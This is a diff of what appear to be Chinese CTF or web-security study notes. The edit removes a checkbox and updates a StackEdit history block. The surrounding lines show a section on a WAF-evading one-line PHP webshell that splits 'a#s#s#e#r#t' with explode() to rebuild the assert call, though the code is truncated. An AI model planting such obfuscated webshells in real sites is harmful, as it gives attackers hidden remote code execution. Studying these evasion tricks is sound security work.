@@ -548,7 +548,6 @@ class Flag{//flag.php
 这是啥??懵逼
 想想应该是编码问题
 ## 过狗一句话 
-- [X]
 ```php
 <?php 
 	$poc="a#s#s#e#r#t"; 
@@ -572,11 +571,11 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxNDU3NzE1MDgsLTEyOTg4MTMyMzEsNT
-kzODM1MDEsLTEzMjk2MTgwNDQsLTk4MTEzNTk5MCwyNTY3NDI4
-NzYsLTQ5MzkyMTQxNywxODc5MDIwNzYzLDE4NjIyMjE2NTMsLT
-ExNjI0OTU4ODQsMTY2NDk2NzE0NiwtMTg1Mzc2Mzg0OCwtNzk5
-MTMyMjcyLC0xOTQ5MTczMzE4LDc5NTcxNTYyNSw0NTQxMjU2Mj
-MsLTExNzc0MDc5NDYsLTc3OTYzNDc4NCwtNjQ1Nzc5NjA2LDE0
-MDMyMzcxODFdfQ==
+eyJoaXN0b3J5IjpbMTQ3NjAxOTQzOSwtMjE0NTc3MTUwOCwtMT
+I5ODgxMzIzMSw1OTM4MzUwMSwtMTMyOTYxODA0NCwtOTgxMTM1
+OTkwLDI1Njc0Mjg3NiwtNDkzOTIxNDE3LDE4NzkwMjA3NjMsMT
+g2MjIyMTY1MywtMTE2MjQ5NTg4NCwxNjY0OTY3MTQ2LC0xODUz
+NzYzODQ4LC03OTkxMzIyNzIsLTE5NDkxNzMzMTgsNzk1NzE1Nj
+I1LDQ1NDEyNTYyMywtMTE3NzQwNzk0NiwtNzc5NjM0Nzg0LC02
+NDU3Nzk2MDZdfQ==
 -->
